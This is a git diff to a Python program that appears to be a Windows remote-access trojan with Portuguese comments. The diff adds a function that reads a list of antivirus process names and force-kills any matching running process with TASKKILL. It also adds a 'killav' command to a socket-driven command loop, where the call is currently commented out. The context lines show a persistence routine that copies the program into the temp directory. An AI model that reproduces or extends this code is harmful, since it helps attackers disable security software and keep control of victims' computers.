@@ -30,6 +30,21 @@ TEMPDIR = tempfile.gettempdir()
     Print stderr + stdout no lado do cliente para que no lado do servidor não trave .
 '''
 
+def kill_antivirus():
+    with open('av.txt') as f:
+        avs = f.read()
+        avs = avs.split('\n')
+    processes=get_output('TASKLIST /FI "STATUS eq RUNNING"')
+    ps = []
+    for i in processes.split(' '):
+        if (".exe" in i):
+            ps.append(i.replace('K\n','').replace('\n',''))
+    for av in avs:
+        for p in ps:
+            if(p == av):
+                subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
+
+
 def persistencia():
     if(not os.getcwd() == TEMPDIR):
         subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
@@ -92,6 +107,10 @@ def executa(socket):
 
                     elif(dados=='download'):
                         pass
+                    elif(dados=='killav'):
+                        #kill_antivirus()
+                        pass
+
                 except:
                     return
         except: # algum erro ocorreu, recomeça
